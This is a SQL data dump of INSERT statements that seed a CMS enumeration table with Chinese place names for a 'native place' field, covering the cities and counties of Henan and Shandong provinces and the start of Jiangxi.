INSERT INTO dede_sys_enum VALUES ('18448', '商丘市', '8514', 'nativeplace', '8514', '1');
INSERT INTO dede_sys_enum VALUES ('18447', '邓州市', '8513.13', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18446', '桐柏县', '8513.12', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18445', '新野县', '8513.11', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18444', '唐河县', '8513.10', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18443', '社旗县', '8513.9', 'nativeplace', '8514', '2');
INSERT INTO dede_sys_enum VALUES ('18442', '淅川县', '8513.8', 'nativeplace', '8514', '2');
INSERT INTO dede_sys_enum VALUES ('18441', '内乡县', '8513.7', 'nativeplace', '8514', '2');
INSERT INTO dede_sys_enum VALUES ('18440', '镇平县', '8513.6', 'nativeplace', '8514', '2');
INSERT INTO dede_sys_enum VALUES ('18439', '西峡县', '8513.5', 'nativeplace', '8514', '2');
INSERT INTO dede_sys_enum VALUES ('18438', '方城县', '8513.4', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18437', '南召县', '8513.3', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18436', '卧龙区', '8513.2', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18435', '宛城区', '8513.1', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18434', '南阳市', '8513', 'nativeplace', '8513', '1');
INSERT INTO dede_sys_enum VALUES ('18433', '灵宝市', '8512.6', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18432', '义马市', '8512.5', 'nativeplace', '8513', '2');
INSERT INTO dede_sys_enum VALUES ('18431', '卢氏县', '8512.4', 'nativeplace', '8512', '2');
INSERT INTO dede_sys_enum VALUES ('18430', '陕　县', '8512.3', 'nativeplace', '8512', '2');
INSERT INTO dede_sys_enum VALUES ('18429', '渑池县', '8512.2', 'nativeplace', '8512', '2');
INSERT INTO dede_sys_enum VALUES ('18428', '湖滨区', '8512.1', 'nativeplace', '8512', '2');
INSERT INTO dede_sys_enum VALUES ('18427', '三门峡市', '8512', 'nativeplace', '8512', '1');
INSERT INTO dede_sys_enum VALUES ('18426', '临颍县', '8511.5', 'nativeplace', '8512', '2');
INSERT INTO dede_sys_enum VALUES ('18425', '舞阳县', '8511.4', 'nativeplace', '8511', '2');
INSERT INTO dede_sys_enum VALUES ('18424', '召陵区', '8511.3', 'nativeplace', '8511', '2');
INSERT INTO dede_sys_enum VALUES ('18423', '郾城区', '8511.2', 'nativeplace', '8511', '2');
INSERT INTO dede_sys_enum VALUES ('18422', '源汇区', '8511.1', 'nativeplace', '8511', '2');
INSERT INTO dede_sys_enum VALUES ('18421', '漯河市', '8511', 'nativeplace', '8511', '1');
INSERT INTO dede_sys_enum VALUES ('18420', '长葛市', '8510.6', 'nativeplace', '8511', '2');
INSERT INTO dede_sys_enum VALUES ('18419', '禹州市', '8510.5', 'nativeplace', '8511', '2');
INSERT INTO dede_sys_enum VALUES ('18418', '襄城县', '8510.4', 'nativeplace', '8510', '2');
INSERT INTO dede_sys_enum VALUES ('18417', '鄢陵县', '8510.3', 'nativeplace', '8510', '2');
INSERT INTO dede_sys_enum VALUES ('18416', '许昌县', '8510.2', 'nativeplace', '8510', '2');
INSERT INTO dede_sys_enum VALUES ('18415', '魏都区', '8510.1', 'nativeplace', '8510', '2');
INSERT INTO dede_sys_enum VALUES ('18414', '许昌市', '8510', 'nativeplace', '8510', '1');
INSERT INTO dede_sys_enum VALUES ('18413', '濮阳县', '8509.6', 'nativeplace', '8510', '2');
INSERT INTO dede_sys_enum VALUES ('18412', '台前县', '8509.5', 'nativeplace', '8510', '2');
INSERT INTO dede_sys_enum VALUES ('18411', '范　县', '8509.4', 'nativeplace', '8509', '2');
INSERT INTO dede_sys_enum VALUES ('18410', '南乐县', '8509.3', 'nativeplace', '8509', '2');
INSERT INTO dede_sys_enum VALUES ('18409', '清丰县', '8509.2', 'nativeplace', '8509', '2');
INSERT INTO dede_sys_enum VALUES ('18408', '华龙区', '8509.1', 'nativeplace', '8509', '2');
INSERT INTO dede_sys_enum VALUES ('18407', '濮阳市', '8509', 'nativeplace', '8509', '1');
INSERT INTO dede_sys_enum VALUES ('18406', '孟州市', '8508.11', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18405', '沁阳市', '8508.10', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18404', '济源市', '8508.9', 'nativeplace', '8509', '2');
INSERT INTO dede_sys_enum VALUES ('18403', '温　县', '8508.8', 'nativeplace', '8509', '2');
INSERT INTO dede_sys_enum VALUES ('18402', '武陟县', '8508.7', 'nativeplace', '8509', '2');
INSERT INTO dede_sys_enum VALUES ('18401', '博爱县', '8508.6', 'nativeplace', '8509', '2');
INSERT INTO dede_sys_enum VALUES ('18400', '修武县', '8508.5', 'nativeplace', '8509', '2');
INSERT INTO dede_sys_enum VALUES ('18399', '山阳区', '8508.4', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18398', '马村区', '8508.3', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18397', '中站区', '8508.2', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18396', '解放区', '8508.1', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18395', '焦作市', '8508', 'nativeplace', '8508', '1');
INSERT INTO dede_sys_enum VALUES ('18394', '辉县市', '8507.12', 'nativeplace', '8507', '2');
INSERT INTO dede_sys_enum VALUES ('18393', '卫辉市', '8507.11', 'nativeplace', '8507', '2');
INSERT INTO dede_sys_enum VALUES ('18392', '长垣县', '8507.10', 'nativeplace', '8507', '2');
INSERT INTO dede_sys_enum VALUES ('18391', '封丘县', '8507.9', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18390', '延津县', '8507.8', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18389', '原阳县', '8507.7', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18388', '获嘉县', '8507.6', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18387', '新乡县', '8507.5', 'nativeplace', '8508', '2');
INSERT INTO dede_sys_enum VALUES ('18386', '牧野区', '8507.4', 'nativeplace', '8507', '2');
INSERT INTO dede_sys_enum VALUES ('18385', '凤泉区', '8507.3', 'nativeplace', '8507', '2');
INSERT INTO dede_sys_enum VALUES ('18384', '卫滨区', '8507.2', 'nativeplace', '8507', '2');
INSERT INTO dede_sys_enum VALUES ('18383', '红旗区', '8507.1', 'nativeplace', '8507', '2');
INSERT INTO dede_sys_enum VALUES ('18382', '新乡市', '8507', 'nativeplace', '8507', '1');
INSERT INTO dede_sys_enum VALUES ('18381', '淇　县', '8506.5', 'nativeplace', '8507', '2');
INSERT INTO dede_sys_enum VALUES ('18380', '浚　县', '8506.4', 'nativeplace', '8506', '2');
INSERT INTO dede_sys_enum VALUES ('18379', '淇滨区', '8506.3', 'nativeplace', '8506', '2');
INSERT INTO dede_sys_enum VALUES ('18378', '山城区', '8506.2', 'nativeplace', '8506', '2');
INSERT INTO dede_sys_enum VALUES ('18377', '鹤山区', '8506.1', 'nativeplace', '8506', '2');
INSERT INTO dede_sys_enum VALUES ('18376', '鹤壁市', '8506', 'nativeplace', '8506', '1');
INSERT INTO dede_sys_enum VALUES ('18375', '林州市', '8505.9', 'nativeplace', '8506', '2');
INSERT INTO dede_sys_enum VALUES ('18374', '内黄县', '8505.8', 'nativeplace', '8506', '2');
INSERT INTO dede_sys_enum VALUES ('18373', '滑　县', '8505.7', 'nativeplace', '8506', '2');
INSERT INTO dede_sys_enum VALUES ('18372', '汤阴县', '8505.6', 'nativeplace', '8506', '2');
INSERT INTO dede_sys_enum VALUES ('18371', '安阳县', '8505.5', 'nativeplace', '8506', '2');
INSERT INTO dede_sys_enum VALUES ('18370', '龙安区', '8505.4', 'nativeplace', '8505', '2');
INSERT INTO dede_sys_enum VALUES ('18369', '殷都区', '8505.3', 'nativeplace', '8505', '2');
INSERT INTO dede_sys_enum VALUES ('18368', '北关区', '8505.2', 'nativeplace', '8505', '2');
INSERT INTO dede_sys_enum VALUES ('18367', '文峰区', '8505.1', 'nativeplace', '8505', '2');
INSERT INTO dede_sys_enum VALUES ('18366', '安阳市', '8505', 'nativeplace', '8505', '1');
INSERT INTO dede_sys_enum VALUES ('18365', '汝州市', '8504.10', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18364', '舞钢市', '8504.9', 'nativeplace', '8505', '2');
INSERT INTO dede_sys_enum VALUES ('18363', '郏　县', '8504.8', 'nativeplace', '8505', '2');
INSERT INTO dede_sys_enum VALUES ('18362', '鲁山县', '8504.7', 'nativeplace', '8505', '2');
INSERT INTO dede_sys_enum VALUES ('18361', '叶　县', '8504.6', 'nativeplace', '8505', '2');
INSERT INTO dede_sys_enum VALUES ('18360', '宝丰县', '8504.5', 'nativeplace', '8505', '2');
INSERT INTO dede_sys_enum VALUES ('18359', '湛河区', '8504.4', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18358', '石龙区', '8504.3', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18357', '卫东区', '8504.2', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18356', '新华区', '8504.1', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18355', '平顶山市', '8504', 'nativeplace', '8504', '1');
INSERT INTO dede_sys_enum VALUES ('18354', '偃师市', '8503.15', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18353', '伊川县', '8503.14', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18352', '洛宁县', '8503.13', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18351', '宜阳县', '8503.12', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18350', '汝阳县', '8503.11', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18349', '嵩　县', '8503.10', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18348', '栾川县', '8503.9', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18347', '新安县', '8503.8', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18346', '孟津县', '8503.7', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18345', '洛龙区', '8503.6', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18344', '吉利区', '8503.5', 'nativeplace', '8504', '2');
INSERT INTO dede_sys_enum VALUES ('18343', '涧西区', '8503.4', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18342', '廛河回族区', '8503.3', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18341', '西工区', '8503.2', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18340', '老城区', '8503.1', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18339', '洛阳市', '8503', 'nativeplace', '8503', '1');
INSERT INTO dede_sys_enum VALUES ('18338', '兰考县', '8502.10', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18337', '开封县', '8502.9', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18336', '尉氏县', '8502.8', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18335', '通许县', '8502.7', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18334', '杞　县', '8502.6', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18333', '郊　区', '8502.5', 'nativeplace', '8503', '2');
INSERT INTO dede_sys_enum VALUES ('18332', '南关区', '8502.4', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18331', '鼓楼区', '8502.3', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18330', '顺河回族区', '8502.2', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18329', '龙亭区', '8502.1', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18328', '开封市', '8502', 'nativeplace', '8502', '1');
INSERT INTO dede_sys_enum VALUES ('18327', '登封市', '8501.12', 'nativeplace', '8501', '2');
INSERT INTO dede_sys_enum VALUES ('18326', '新郑市', '8501.11', 'nativeplace', '8501', '2');
INSERT INTO dede_sys_enum VALUES ('18325', '新密市', '8501.10', 'nativeplace', '8501', '2');
INSERT INTO dede_sys_enum VALUES ('18324', '荥阳市', '8501.9', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18323', '巩义市', '8501.8', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18322', '中牟县', '8501.7', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18321', '邙山区', '8501.6', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18320', '上街区', '8501.5', 'nativeplace', '8502', '2');
INSERT INTO dede_sys_enum VALUES ('18319', '金水区', '8501.4', 'nativeplace', '8501', '2');
INSERT INTO dede_sys_enum VALUES ('18318', '管城回族区', '8501.3', 'nativeplace', '8501', '2');
INSERT INTO dede_sys_enum VALUES ('18317', '二七区', '8501.2', 'nativeplace', '8501', '2');
INSERT INTO dede_sys_enum VALUES ('18316', '中原区', '8501.1', 'nativeplace', '8501', '2');
INSERT INTO dede_sys_enum VALUES ('18315', '郑州市', '8501', 'nativeplace', '8501', '1');
INSERT INTO dede_sys_enum VALUES ('18314', '河南省', '8500', 'nativeplace', '8500', '0');
INSERT INTO dede_sys_enum VALUES ('18313', '东明县', '8016.9', 'nativeplace', '8017', '2');
INSERT INTO dede_sys_enum VALUES ('18312', '定陶县', '8016.8', 'nativeplace', '8017', '2');
INSERT INTO dede_sys_enum VALUES ('18311', '鄄城县', '8016.7', 'nativeplace', '8017', '2');
INSERT INTO dede_sys_enum VALUES ('18310', '郓城县', '8016.6', 'nativeplace', '8017', '2');
INSERT INTO dede_sys_enum VALUES ('18309', '巨野县', '8016.5', 'nativeplace', '8017', '2');
INSERT INTO dede_sys_enum VALUES ('18308', '成武县', '8016.4', 'nativeplace', '8016', '2');
INSERT INTO dede_sys_enum VALUES ('18307', '单　县', '8016.3', 'nativeplace', '8016', '2');
INSERT INTO dede_sys_enum VALUES ('18306', '曹　县', '8016.2', 'nativeplace', '8016', '2');
INSERT INTO dede_sys_enum VALUES ('18305', '牡丹区', '8016.1', 'nativeplace', '8016', '2');
INSERT INTO dede_sys_enum VALUES ('18304', '荷泽市', '8016', 'nativeplace', '8016', '1');
INSERT INTO dede_sys_enum VALUES ('18303', '邹平县', '8015.7', 'nativeplace', '8016', '2');
INSERT INTO dede_sys_enum VALUES ('18302', '博兴县', '8015.6', 'nativeplace', '8016', '2');
INSERT INTO dede_sys_enum VALUES ('18301', '沾化县', '8015.5', 'nativeplace', '8016', '2');
INSERT INTO dede_sys_enum VALUES ('18300', '无棣县', '8015.4', 'nativeplace', '8015', '2');
INSERT INTO dede_sys_enum VALUES ('18299', '阳信县', '8015.3', 'nativeplace', '8015', '2');
INSERT INTO dede_sys_enum VALUES ('18298', '惠民县', '8015.2', 'nativeplace', '8015', '2');
INSERT INTO dede_sys_enum VALUES ('18297', '滨城区', '8015.1', 'nativeplace', '8015', '2');
INSERT INTO dede_sys_enum VALUES ('18296', '滨州市', '8015', 'nativeplace', '8015', '1');
INSERT INTO dede_sys_enum VALUES ('18295', '临清市', '8014.8', 'nativeplace', '8015', '2');
INSERT INTO dede_sys_enum VALUES ('18294', '高唐县', '8014.7', 'nativeplace', '8015', '2');
INSERT INTO dede_sys_enum VALUES ('18293', '冠　县', '8014.6', 'nativeplace', '8015', '2');
INSERT INTO dede_sys_enum VALUES ('18292', '东阿县', '8014.5', 'nativeplace', '8015', '2');
INSERT INTO dede_sys_enum VALUES ('18291', '茌平县', '8014.4', 'nativeplace', '8014', '2');
INSERT INTO dede_sys_enum VALUES ('18290', '莘　县', '8014.3', 'nativeplace', '8014', '2');
INSERT INTO dede_sys_enum VALUES ('18289', '阳谷县', '8014.2', 'nativeplace', '8014', '2');
INSERT INTO dede_sys_enum VALUES ('18288', '东昌府区', '8014.1', 'nativeplace', '8014', '2');
INSERT INTO dede_sys_enum VALUES ('18287', '聊城市', '8014', 'nativeplace', '8014', '1');
INSERT INTO dede_sys_enum VALUES ('18286', '禹城市', '8013.11', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18285', '乐陵市', '8013.10', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18284', '武城县', '8013.9', 'nativeplace', '8014', '2');
INSERT INTO dede_sys_enum VALUES ('18283', '夏津县', '8013.8', 'nativeplace', '8014', '2');
INSERT INTO dede_sys_enum VALUES ('18282', '平原县', '8013.7', 'nativeplace', '8014', '2');
INSERT INTO dede_sys_enum VALUES ('18281', '齐河县', '8013.6', 'nativeplace', '8014', '2');
INSERT INTO dede_sys_enum VALUES ('18280', '临邑县', '8013.5', 'nativeplace', '8014', '2');
INSERT INTO dede_sys_enum VALUES ('18279', '庆云县', '8013.4', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18278', '宁津县', '8013.3', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18277', '陵　县', '8013.2', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18276', '德城区', '8013.1', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18275', '德州市', '8013', 'nativeplace', '8013', '1');
INSERT INTO dede_sys_enum VALUES ('18274', '临沭县', '8012.12', 'nativeplace', '8012', '2');
INSERT INTO dede_sys_enum VALUES ('18273', '蒙阴县', '8012.11', 'nativeplace', '8012', '2');
INSERT INTO dede_sys_enum VALUES ('18272', '莒南县', '8012.10', 'nativeplace', '8012', '2');
INSERT INTO dede_sys_enum VALUES ('18271', '平邑县', '8012.9', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18270', '费　县', '8012.8', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18269', '苍山县', '8012.7', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18268', '沂水县', '8012.6', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18267', '郯城县', '8012.5', 'nativeplace', '8013', '2');
INSERT INTO dede_sys_enum VALUES ('18266', '沂南县', '8012.4', 'nativeplace', '8012', '2');
INSERT INTO dede_sys_enum VALUES ('18265', '河东区', '8012.3', 'nativeplace', '8012', '2');
INSERT INTO dede_sys_enum VALUES ('18264', '罗庄区', '8012.2', 'nativeplace', '8012', '2');
INSERT INTO dede_sys_enum VALUES ('18263', '兰山区', '8012.1', 'nativeplace', '8012', '2');
INSERT INTO dede_sys_enum VALUES ('18262', '临沂市', '8012', 'nativeplace', '8012', '1');
INSERT INTO dede_sys_enum VALUES ('18261', '钢城区', '8011.2', 'nativeplace', '8011', '2');
INSERT INTO dede_sys_enum VALUES ('18260', '莱城区', '8011.1', 'nativeplace', '8011', '2');
INSERT INTO dede_sys_enum VALUES ('18259', '莱芜市', '8011', 'nativeplace', '8011', '1');
INSERT INTO dede_sys_enum VALUES ('18258', '莒　县', '8010.4', 'nativeplace', '8010', '2');
INSERT INTO dede_sys_enum VALUES ('18257', '五莲县', '8010.3', 'nativeplace', '8010', '2');
INSERT INTO dede_sys_enum VALUES ('18256', '岚山区', '8010.2', 'nativeplace', '8010', '2');
INSERT INTO dede_sys_enum VALUES ('18255', '东港区', '8010.1', 'nativeplace', '8010', '2');
INSERT INTO dede_sys_enum VALUES ('18254', '日照市', '8010', 'nativeplace', '8010', '1');
INSERT INTO dede_sys_enum VALUES ('18253', '乳山市', '8009.4', 'nativeplace', '8009', '2');
INSERT INTO dede_sys_enum VALUES ('18252', '荣成市', '8009.3', 'nativeplace', '8009', '2');
INSERT INTO dede_sys_enum VALUES ('18251', '文登市', '8009.2', 'nativeplace', '8009', '2');
INSERT INTO dede_sys_enum VALUES ('18250', '环翠区', '8009.1', 'nativeplace', '8009', '2');
INSERT INTO dede_sys_enum VALUES ('18249', '威海市', '8009', 'nativeplace', '8009', '1');
INSERT INTO dede_sys_enum VALUES ('18248', '肥城市', '8008.6', 'nativeplace', '8009', '2');
INSERT INTO dede_sys_enum VALUES ('18247', '新泰市', '8008.5', 'nativeplace', '8009', '2');
INSERT INTO dede_sys_enum VALUES ('18246', '东平县', '8008.4', 'nativeplace', '8008', '2');
INSERT INTO dede_sys_enum VALUES ('18245', '宁阳县', '8008.3', 'nativeplace', '8008', '2');
INSERT INTO dede_sys_enum VALUES ('18244', '岱岳区', '8008.2', 'nativeplace', '8008', '2');
INSERT INTO dede_sys_enum VALUES ('18243', '泰山区', '8008.1', 'nativeplace', '8008', '2');
INSERT INTO dede_sys_enum VALUES ('18242', '泰安市', '8008', 'nativeplace', '8008', '1');
INSERT INTO dede_sys_enum VALUES ('18241', '邹城市', '8007.12', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18240', '兖州市', '8007.11', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18239', '曲阜市', '8007.10', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18238', '梁山县', '8007.9', 'nativeplace', '8008', '2');
INSERT INTO dede_sys_enum VALUES ('18237', '泗水县', '8007.8', 'nativeplace', '8008', '2');
INSERT INTO dede_sys_enum VALUES ('18236', '汶上县', '8007.7', 'nativeplace', '8008', '2');
INSERT INTO dede_sys_enum VALUES ('18235', '嘉祥县', '8007.6', 'nativeplace', '8008', '2');
INSERT INTO dede_sys_enum VALUES ('18234', '金乡县', '8007.5', 'nativeplace', '8008', '2');
INSERT INTO dede_sys_enum VALUES ('18233', '鱼台县', '8007.4', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18232', '微山县', '8007.3', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18231', '任城区', '8007.2', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18230', '市中区', '8007.1', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18229', '济宁市', '8007', 'nativeplace', '8007', '1');
INSERT INTO dede_sys_enum VALUES ('18228', '昌邑市', '8006.12', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18227', '高密市', '8006.11', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18226', '安丘市', '8006.10', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18225', '寿光市', '8006.9', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18224', '诸城市', '8006.8', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18223', '青州市', '8006.7', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18222', '昌乐县', '8006.6', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18221', '临朐县', '8006.5', 'nativeplace', '8007', '2');
INSERT INTO dede_sys_enum VALUES ('18220', '奎文区', '8006.4', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18219', '坊子区', '8006.3', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18218', '寒亭区', '8006.2', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18217', '潍城区', '8006.1', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18216', '潍坊市', '8006', 'nativeplace', '8006', '1');
INSERT INTO dede_sys_enum VALUES ('18215', '海阳市', '8005.12', 'nativeplace', '8005', '2');
INSERT INTO dede_sys_enum VALUES ('18214', '栖霞市', '8005.11', 'nativeplace', '8005', '2');
INSERT INTO dede_sys_enum VALUES ('18213', '招远市', '8005.10', 'nativeplace', '8005', '2');
INSERT INTO dede_sys_enum VALUES ('18212', '蓬莱市', '8005.9', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18211', '莱州市', '8005.8', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18210', '莱阳市', '8005.7', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18209', '龙口市', '8005.6', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18208', '长岛县', '8005.5', 'nativeplace', '8006', '2');
INSERT INTO dede_sys_enum VALUES ('18207', '莱山区', '8005.4', 'nativeplace', '8005', '2');
INSERT INTO dede_sys_enum VALUES ('18206', '牟平区', '8005.3', 'nativeplace', '8005', '2');
INSERT INTO dede_sys_enum VALUES ('18205', '福山区', '8005.2', 'nativeplace', '8005', '2');
INSERT INTO dede_sys_enum VALUES ('18204', '芝罘区', '8005.1', 'nativeplace', '8005', '2');
INSERT INTO dede_sys_enum VALUES ('18203', '烟台市', '8005', 'nativeplace', '8005', '1');
INSERT INTO dede_sys_enum VALUES ('18202', '滕州市', '8004.6', 'nativeplace', '8005', '2');
INSERT INTO dede_sys_enum VALUES ('18201', '山亭区', '8004.5', 'nativeplace', '8005', '2');
INSERT INTO dede_sys_enum VALUES ('18200', '台儿庄区', '8004.4', 'nativeplace', '8004', '2');
INSERT INTO dede_sys_enum VALUES ('18199', '峄城区', '8004.3', 'nativeplace', '8004', '2');
INSERT INTO dede_sys_enum VALUES ('18198', '薛城区', '8004.2', 'nativeplace', '8004', '2');
INSERT INTO dede_sys_enum VALUES ('18197', '市中区', '8004.1', 'nativeplace', '8004', '2');
INSERT INTO dede_sys_enum VALUES ('18196', '枣庄市', '8004', 'nativeplace', '8004', '1');
INSERT INTO dede_sys_enum VALUES ('18195', '沂源县', '8003.8', 'nativeplace', '8004', '2');
INSERT INTO dede_sys_enum VALUES ('18194', '高青县', '8003.7', 'nativeplace', '8004', '2');
INSERT INTO dede_sys_enum VALUES ('18193', '桓台县', '8003.6', 'nativeplace', '8004', '2');
INSERT INTO dede_sys_enum VALUES ('18192', '周村区', '8003.5', 'nativeplace', '8004', '2');
INSERT INTO dede_sys_enum VALUES ('18191', '临淄区', '8003.4', 'nativeplace', '8003', '2');
INSERT INTO dede_sys_enum VALUES ('18190', '博山区', '8003.3', 'nativeplace', '8003', '2');
INSERT INTO dede_sys_enum VALUES ('18189', '张店区', '8003.2', 'nativeplace', '8003', '2');
INSERT INTO dede_sys_enum VALUES ('18188', '淄川区', '8003.1', 'nativeplace', '8003', '2');
INSERT INTO dede_sys_enum VALUES ('18187', '淄博市', '8003', 'nativeplace', '8003', '1');
INSERT INTO dede_sys_enum VALUES ('18186', '莱西市', '8002.12', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18185', '胶南市', '8002.11', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18184', '平度市', '8002.10', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18183', '即墨市', '8002.9', 'nativeplace', '8003', '2');
INSERT INTO dede_sys_enum VALUES ('18182', '胶州市', '8002.8', 'nativeplace', '8003', '2');
INSERT INTO dede_sys_enum VALUES ('18181', '城阳区', '8002.7', 'nativeplace', '8003', '2');
INSERT INTO dede_sys_enum VALUES ('18180', '李沧区', '8002.6', 'nativeplace', '8003', '2');
INSERT INTO dede_sys_enum VALUES ('18179', '崂山区', '8002.5', 'nativeplace', '8003', '2');
INSERT INTO dede_sys_enum VALUES ('18178', '黄岛区', '8002.4', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18177', '四方区', '8002.3', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18176', '市北区', '8002.2', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18175', '市南区', '8002.1', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18174', '青岛市', '8002', 'nativeplace', '8002', '1');
INSERT INTO dede_sys_enum VALUES ('18173', '章丘市', '8001.10', 'nativeplace', '8001', '2');
INSERT INTO dede_sys_enum VALUES ('18172', '商河县', '8001.9', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18171', '济阳县', '8001.8', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18170', '平阴县', '8001.7', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18169', '长清区', '8001.6', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18168', '历城区', '8001.5', 'nativeplace', '8002', '2');
INSERT INTO dede_sys_enum VALUES ('18167', '天桥区', '8001.4', 'nativeplace', '8001', '2');
INSERT INTO dede_sys_enum VALUES ('18166', '槐荫区', '8001.3', 'nativeplace', '8001', '2');
INSERT INTO dede_sys_enum VALUES ('18165', '市中区', '8001.2', 'nativeplace', '8001', '2');
INSERT INTO dede_sys_enum VALUES ('18164', '历下区', '8001.1', 'nativeplace', '8001', '2');
INSERT INTO dede_sys_enum VALUES ('18163', '济南市', '8001', 'nativeplace', '8001', '1');
INSERT INTO dede_sys_enum VALUES ('18162', '山东省', '8000', 'nativeplace', '8000', '0');
INSERT INTO dede_sys_enum VALUES ('18161', '德兴市', '7511.12', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18160', '婺源县', '7511.11', 'nativeplace', '7511', '2');
